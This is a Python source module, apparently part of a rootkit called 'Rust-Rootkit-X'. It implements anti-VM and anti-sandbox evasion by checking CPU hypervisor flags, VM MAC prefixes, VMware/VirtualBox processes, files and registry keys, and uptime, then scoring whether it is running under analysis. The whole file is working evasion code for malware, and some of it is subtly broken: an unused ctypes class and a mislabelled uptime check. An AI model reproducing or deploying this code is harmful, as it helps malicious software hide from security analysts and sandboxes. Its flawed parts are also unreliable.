"""
anti_vm — Rust-Rootkit-X (evasion) / anti-sandbox.
Detection de VM/sandbox: CPUID hyperviseur, MAC OUI, artefacts VMWare/VirtualBox,
registre, disque, uptime, processus. Multi-plateforme.
Actions: check, cpu, mac, artifacts, summary
"""
NAME = "anti_vm"
VERSION = "1.0.0"
DESCRIPTION = "Detection de VM/sandbox: CPUID, MAC, artefacts VMWare/VirtualBox/KVM."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import os
import platform
import re
import subprocess
import sys

VM_MACS = {
    "00:05:69": "VMware", "00:0c:29": "VMware", "00:1c:14": "VMware",
    "00:50:56": "VMware", "00:15:5d": "Hyper-V", "00:03:ff": "Microsoft",
    "08:00:27": "VirtualBox", "0a:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
}
VM_PROCESSES = ["vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice",
                "vboxtray", "xenservice", "qemu-ga", "VGAuthService"]
VM_FILES_WIN = [r"C:\Program Files\VMware", r"C:\Program Files\Oracle\VirtualBox",
                r"C:\Windows\System32\vm3dservice.exe"]
VM_REG_KEYS = [r"HKLM\SOFTWARE\VMware, Inc.", r"HKLM\SOFTWARE\Oracle\VirtualBox"]
_bs = chr(92)


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def run(action, params):
    try:
        if action == "check":
            return _check(params)
        if action == "cpu":
            return _cpu(params)
        if action == "mac":
            return _mac(params)
        if action == "artifacts":
            return _artifacts(params)
        if action == "summary":
            return _check(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="anti_vm: " + str(exc), status="failed")


def _cpu(params):
    result = {}
    if os.name == "nt":
        import ctypes
        class REGS:
            _fields_ = [("eax", ctypes.c_uint32), ("ebx", ctypes.c_uint32),
                        ("ecx", ctypes.c_uint32), ("edx", ctypes.c_uint32)]
        regs = REGS()
        if ctypes.windll.kernel32.IsProcessorFeaturePresent(0x20):  # hypervisor
            result["hypervisor_feature"] = True
        try:
            result["vendor"] = platform.processor()
        except Exception:
            pass
        try:
            p = subprocess.run("wmic cpu get Manufacturer /value", shell=True,
                               capture_output=True, text=True, timeout=15)
            result["wmic"] = (p.stdout or "").strip()[:200]
        except Exception:
            pass
    else:
        try:
            with open("/proc/cpuinfo", "r") as fh:
                txt = fh.read()
            for line in txt.splitlines():
                if "hypervisor" in line.lower() or "qemu" in line.lower():
                    result["cpuinfo_hint"] = line.strip()
            m = re.search(r"vendor_id\s*:\s*(\S+)", txt)
            if m:
                result["vendor"] = m.group(1)
        except Exception:
            pass
    return _result(data=result)


def _mac(params):
    macs = []
    if os.name == "nt":
        try:
            p = subprocess.run("getmac /fo csv /nh", shell=True,
                               capture_output=True, text=True, timeout=15)
            for line in (p.stdout or "").splitlines():
                m = re.search(r"([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2}", line)
                if m:
                    macs.append(m.group(0).replace("-", ":").lower())
        except Exception:
            pass
    else:
        try:
            p = subprocess.run(["sh", "-c", "cat /sys/class/net/*/address 2>/dev/null"],
                               capture_output=True, text=True, timeout=10)
            macs = [l.strip() for l in (p.stdout or "").splitlines() if l.strip()]
        except Exception:
            pass
    detected = []
    for mac in macs:
        prefix = mac[:8]
        if prefix in VM_MACS:
            detected.append({"mac": mac, "vendor": VM_MACS[prefix]})
    return _result(data={"macs": macs, "vm_detected": detected})


def _artifacts(params):
    hits = []
    for proc in VM_PROCESSES:
        try:
            if os.name == "nt":
                p = subprocess.run("tasklist /fi " + chr(34) + "IMAGENAME eq " +
                                   proc + ".exe" + chr(34) + " /nh", shell=True,
                                   capture_output=True, text=True, timeout=15)
                if proc.lower() in (p.stdout or "").lower():
                    hits.append({"type": "process", "name": proc})
            else:
                for line in os.popen("ps aux").read().splitlines():
                    if proc.lower() in line.lower():
                        hits.append({"type": "process", "name": proc})
                        break
        except Exception:
            continue
    if os.name == "nt":
        for fp in VM_FILES_WIN:
            if os.path.isdir(fp) or os.path.isfile(fp):
                hits.append({"type": "file", "path": fp})
        for key in VM_REG_KEYS:
            p = subprocess.run("reg query " + key + " 2>nul", shell=True,
                               capture_output=True, text=True, timeout=15)
            if p.returncode == 0:
                hits.append({"type": "registry", "key": key})
    return _result(data={"artifacts": hits, "count": len(hits)})


def _check(params):
    checks = {}
    c = _cpu(params).get("data", {})
    checks["cpu"] = c
    m = _mac(params).get("data", {})
    checks["mac"] = m
    a = _artifacts(params).get("data", {})
    checks["artifacts"] = a
    vm_score = 0
    if m.get("vm_detected"):
        vm_score += 2
    if a.get("count", 0):
        vm_score += min(a["count"], 3)
    if c.get("hypervisor_feature") or c.get("cpuinfo_hint"):
        vm_score += 2
    checks["uptime_s"] = None
    try:
        if os.name == "nt":
            p = subprocess.run("powershell -NoProfile -Command "
                               "(Get-Date)-((Get-Process -Id $PID).StartTime)",
                               shell=True, capture_output=True, text=True, timeout=20)
            checks["uptime_s"] = (p.stdout or "").strip()
        else:
            with open("/proc/uptime", "r") as fh:
                checks["uptime_s"] = float(fh.read().split()[0])
    except Exception:
        pass
    verdict = "vm" if vm_score >= 3 else "likely_vm" if vm_score == 2 else "clean"
    return _result(data={"score": vm_score, "verdict": verdict, "checks": checks})
